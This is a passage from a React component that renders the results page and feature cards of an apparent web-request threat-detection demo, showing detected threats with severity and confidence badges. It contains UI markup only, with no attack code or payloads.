                                analysis.isClean ? "bg-secondary/20 text-secondary" : "bg-destructive/20 text-destructive"
                              }`}
                            >
                              {analysis.isClean ? (
                                <>
                                  <CheckCircle className="h-4 w-4 mr-2" />
                                  Secure Request
                                </>
                              ) : (
                                <>
                                  <AlertTriangle className="h-4 w-4 mr-2" />
                                  Threats Detected
                                </>
                              )}
                            </Badge>
                            <div className="text-right">
                              <p className="text-sm font-medium text-foreground">
                                {analysis.threats.length} Issue{analysis.threats.length !== 1 ? 's' : ''} Found
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* Threats List */}
                      {analysis.threats.length === 0 ? (
                        <Alert className="border-secondary/30 bg-secondary/10">
                          <CheckCircle className="h-5 w-5 text-secondary" />
                          <AlertDescription className="text-base">
                            <strong>All Clear!</strong> No security threats detected. This request appears to be legitimate and safe.
                          </AlertDescription>
                        </Alert>
                      ) : (
                        <div className="space-y-4">
                          <h3 className="font-semibold text-destructive text-lg flex items-center">
                            <AlertTriangle className="h-5 w-5 mr-2" />
                            {analysis.threats.length} Security Threat{analysis.threats.length !== 1 ? 's' : ''} Detected
                          </h3>
                          <div className="space-y-3">
                            {analysis.threats.map((threat, index) => (
                              <Alert key={index} variant="destructive" className="border-destructive/30 bg-destructive/10">
                                <AlertTriangle className="h-4 w-4 text-destructive" />
                                <AlertDescription>
                                  <div className="space-y-3">
                                    <div className="flex items-center justify-between">
                                      <span className="font-semibold text-base text-destructive">{threat.type}</span>
                                      <div className="flex items-center space-x-2">
                                        <Badge variant={
                                          threat.severity === "critical" ? "destructive" :
                                          threat.severity === "high" ? "destructive" :
                                          threat.severity === "medium" ? "secondary" : "outline"
                                        } className="font-semibold">
                                          {threat.severity.toUpperCase()}
                                        </Badge>
                                        <Badge variant="outline" className="text-xs">
                                          {threat.confidence} confidence
                                        </Badge>
                                      </div>
                                    </div>
                                    <p className="text-sm text-foreground leading-relaxed">{threat.description}</p>
                                    <div className="grid grid-cols-2 gap-4 text-xs text-muted-foreground">
                                      <div>
                                        <span className="font-medium">Location:</span> {threat.location}
                                      </div>
                                      <div>
                                        <span className="font-medium">Category:</span> {threat.category}
                                      </div>
                                    </div>
                                  </div>
                                </AlertDescription>
                              </Alert>
                            ))}
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          </div>

          {/* Enhanced Detection Methods */}
          <div className="mt-16 grid md:grid-cols-3 gap-8">
            <Card className="backdrop-blur-sm bg-gradient-card border-border/50 hover:shadow-cyber/20 transition-all duration-300 group">
              <CardHeader className="text-center pb-4">
                <div className="p-4 rounded-2xl bg-primary/10 mx-auto mb-4 w-fit group-hover:bg-primary/20 transition-colors">
                  <Shield className="h-8 w-8 text-primary" />
                </div>
                <CardTitle className="text-xl">Signature Detection</CardTitle>
              </CardHeader>
              <CardContent className="text-center">
                <p className="text-muted-foreground leading-relaxed">
                  Pattern-based detection engine for known attack vectors including SQL injection, XSS, and command injection
                </p>
              </CardContent>
            </Card>

            <Card className="backdrop-blur-sm bg-gradient-card border-border/50 hover:shadow-tech/20 transition-all duration-300 group">
              <CardHeader className="text-center pb-4">
                <div className="p-4 rounded-2xl bg-secondary/10 mx-auto mb-4 w-fit group-hover:bg-secondary/20 transition-colors">
                  <Brain className="h-8 w-8 text-secondary" />
                </div>
                <CardTitle className="text-xl">AI-Powered Detection</CardTitle>
              </CardHeader>
              <CardContent className="text-center">
                <p className="text-muted-foreground leading-relaxed">
                  Advanced machine learning algorithms for anomaly detection and sophisticated evasion techniques
                </p>
              </CardContent>
            </Card>

            <Card className="backdrop-blur-sm bg-gradient-card border-border/50 hover:shadow-[0_0_30px_hsl(var(--accent)/0.3)] transition-all duration-300 group">
              <CardHeader className="text-center pb-4">
                <div className="p-4 rounded-2xl bg-accent/10 mx-auto mb-4 w-fit group-hover:bg-accent/20 transition-colors">
                  <Zap className="h-8 w-8 text-accent" />
                </div>
                <CardTitle className="text-xl">Real-Time Analysis</CardTitle>
              </CardHeader>
              <CardContent className="text-center">
                <p className="text-muted-foreground leading-relaxed">
                  Instant threat assessment with comprehensive risk scoring and actionable remediation guidance
                </p>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Demo;